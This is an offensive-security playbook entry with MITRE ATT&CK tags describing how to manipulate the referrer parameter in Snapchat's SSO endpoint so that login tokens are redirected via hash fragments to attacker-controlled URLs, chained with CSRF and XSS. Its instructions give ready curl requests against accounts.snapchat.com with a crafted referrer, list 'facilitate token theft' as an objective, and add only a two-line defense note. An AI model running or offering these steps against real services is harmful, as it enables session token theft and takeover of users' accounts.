---
tags:
  - improper-validation
  - referrer-manipulation
type: procedure
tools:
  - '[[tools/Curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-sso-request]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 95514b88-83fc-47ee-a75a-a88fd2be6930
created_at: '2025-12-13T09:01:26.669Z'
updated_at: '2025-12-13T09:01:26.669Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Manipulate Referrer for Token Redirection

## Summary

This procedure manipulates the referrer parameter in Snapchat's SSO request to redirect tokens via hash fragments to attacker-controlled URLs.

## Description

By allowing arbitrary URLs with hash fragments in the referrer, attackers can control redirects and leak tokens. This requires prior CSRF login and leads to XSS exploitation.

## Requirements

1. Access to SSO endpoint
2. Knowledge of valid client_id
3. Tool for sending crafted HTTP requests

## Defense

Defensive measures and detection strategies:

- Validate and restrict referrer parameters
- Strip hash fragments during redirects

## Objectives

1. Fetch SSO token in hash fragment
2. Set up redirect to malicious resource
3. Facilitate token theft

## Instructions

### Step 1: Craft Manipulated Request

**Context**: Send request with custom referrer including hash.

**Command** ([[commands/curl-sso-request]]):
```bash
curl 'https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=https://snappublisher.snapchat.com/api/v1/media/█████████/file/somthine.svg?%23pranav'
```

> This triggers the token redirect.

### Step 2: Verify Redirect

**Context**: Check if token is in hash after redirect.

**Command** ([[commands/curl-sso-request]]):
```bash
curl -v 'https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=<crafted_url>'
```

> Verbose output shows redirect and hash.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-sso-request]]

## Tools Used

- [[tools/Curl]]

## Tags

- [[improper-validation]]
- [[referrer-manipulation]]
